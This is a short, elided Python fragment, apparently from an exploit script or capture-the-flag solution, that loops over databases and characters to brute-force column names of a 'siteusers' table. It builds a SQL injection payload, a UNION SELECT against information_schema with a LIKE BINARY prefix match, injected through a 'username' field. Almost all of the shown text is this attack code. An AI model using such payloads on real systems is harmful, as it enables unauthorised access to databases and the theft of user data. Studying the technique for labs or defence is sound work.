...
for db in dbs:
    ...
    while rotation < len(alphabet):
        ...
        while i < len(alphabet):
            ...
            data = {
                "username": f"' UNION SELECT 1,2,3,4 FROM information_schema.columns WHERE table_schema = '{db}' AND table_name = 'siteusers' AND COLUMN_NAME LIKE BINARY '{result}{char}%'-- -",
